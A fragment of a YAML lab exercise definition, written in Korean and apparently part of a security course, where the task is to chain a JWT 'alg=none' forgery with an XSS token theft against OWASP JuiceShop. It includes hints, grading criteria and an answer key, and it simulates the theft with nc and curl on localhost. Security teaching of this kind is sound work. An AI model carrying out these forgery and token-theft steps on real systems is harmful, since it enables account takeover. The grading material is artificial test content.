+    \ 정찰 (whatweb/nmap) → 식별 (sqlmap/xsstrike) → 후속 작업** 등 적합 도구로 호출 후 stdout quote."
+  hint: 'Phase A: JWT alg=none 은 RFC 7519 의 "unsecured JWS". 라이브러리 별로 차단 정책 다름.
+
+    Phase B: nc -lk 로 localhost 수신, curl 로 발신 — 외부 callback 없이 자체 시뮬레이션.
+
+    Phase C: 4행 매트릭스. JuiceShop 권고 한 줄.
+
+    포인트: 단일 취약점이 아닌 *chain* — JWT 변조 + XSS 가 동시면 자격증명+권한 동시 탈취.
+
+    '
+  category: integration_scenario
+  points: 50
+  verify:
+    type: output_contains
+    expect: 매트릭스
+    field: stdout
+    semantic:
+      intent: 'JWT alg=none 변조 + XSS 토큰 탈취 chain 점검 + 자격증명 방어 매트릭스.
+
+        lecture #1·#2·#3 + lab #7·#8·#9·#6 동시 행동 증명.
+
+        '
+      success_criteria:
+      - Phase A — 원본 JWT 획득 + alg=none 변조 토큰 생성 + whoami 시도
+      - Phase B — XSS payload 텍스트 + nc/curl 토큰 탈취 시뮬레이션
+      - Phase C — 4행 매트릭스 + 종합 권고 한 줄
+      acceptable_methods:
+      - curl POST login + python3 base64 변조
+      - nc -lk + curl 자체 시뮬
+      - markdown table 매트릭스
+      - jwt_tool / pyjwt 추가 가능
+      negative_signs:
+      - JWT 획득만 하고 변조 안 함
+      - XSS payload 만 작성하고 탈취 시뮬 누락
+      - 매트릭스 누락 또는 2행 이하
+      - chain 관점 (JWT+XSS 동시) 분석 누락
+  target_vm: attacker
+  risk_level: low
+  answer: '🤖 위 bastion_prompt 그대로. JWT 변조 → XSS 시뮬 → 매트릭스 echo.
+
+    '
+  answer_detail: 'JWT alg=none 은 학술적 우회 — JuiceShop 은 차단됨. 그 *시도 자체* 가 학습 목표.
+
+    XSS 탈취는 nc 자체 callback 으로 시뮬. 핵심은 *chain* 관점 — 두 취약점이 결합 시 영향 폭증.
+
+    '
+  script: ''
